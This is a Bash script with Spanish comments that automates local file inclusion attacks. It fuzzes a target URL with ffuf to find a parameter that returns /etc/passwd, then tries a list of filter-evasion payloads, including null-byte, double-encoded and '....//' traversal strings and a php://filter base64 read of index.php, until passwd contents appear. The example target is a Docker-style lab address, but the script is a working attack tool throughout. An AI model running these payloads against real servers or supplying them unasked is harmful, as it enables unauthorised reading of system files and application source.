#!/bin/bash

# 🎨 Colores
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# ⚠️ Verifica argumento
if [ -z "$1" ]; then
  echo -e "${CYAN}Uso:${NC} $0 <URL>"
  echo "Ejemplo: $0 http://172.17.0.2/problems.php"
  exit 1
fi

URL="$1"
WORDLIST="/opt/SecLists/Discovery/Web-Content/big.txt"

# 📦 Payloads con evasión
PAYLOADS=(
  "/etc/passwd"
  "/etc/passwd%00"
  "/etc/passwd%00.php"
  "/etc/passwd.."
  "..%2fetc%2fpasswd"
  "..%252fetc%252fpasswd"
  "%252e%252e%252fetc%252fpasswd%00"
  "....//....//etc/passwd"
  "php://filter/convert.base64-encode/resource=index.php"
)

# 🔐 Detectar si es HTTPS
CURL_OPTS="-s"
if echo "$URL" | grep -q "^https://"; then
  CURL_OPTS="-sk"
  echo -e "${CYAN}[!] HTTPS detectado: ignorando verificación de certificado (-k)${NC}"
fi

echo -e "🔍 ${CYAN}Buscando parámetros que acepten '/etc/passwd' en${NC} $URL ..."

# 🚀 Buscar primer parámetro válido
PARAM=$(ffuf -w "$WORDLIST" \
       -u "${URL}?FUZZ=/etc/passwd" \
       -fs 10671 -mc 200 -of csv -o /tmp/lfi_bypass.csv 2>/dev/null |
       grep -v "FUZZ" | cut -d',' -f1 | head -n 1)

if [ -z "$PARAM" ]; then
  echo -e "${RED}❌ No se encontró ningún parámetro válido para LFI.${NC}"
  exit 1
fi

echo -e "${GREEN}[✔] Parámetro encontrado:${NC} $PARAM"
echo -e "${CYAN}🔎 Probando payloads de LFI con bypass...${NC}"

# 🔄 Probar payloads
for payload in "${PAYLOADS[@]}"; do
  FULL_URL="${URL}?${PARAM}=${payload}"
  RESPONSE=$(curl $CURL_OPTS "$FULL_URL")

  echo -e "\n${CYAN}[DEBUG] Probando: $FULL_URL${NC}"
  echo "$RESPONSE" | head -n 10

  if echo "$RESPONSE" | grep -qE "root:x:|daemon:|/bin/bash"; then
    echo -e "${GREEN}[✔] LFI exitoso con payload:${NC} $payload"
    echo "$RESPONSE" | grep -E "root:x:|daemon:|/bin/bash"
    exit 0
  fi
done

echo -e "${RED}[✘] Ningún payload devolvió contenido de /etc/passwd${NC}"
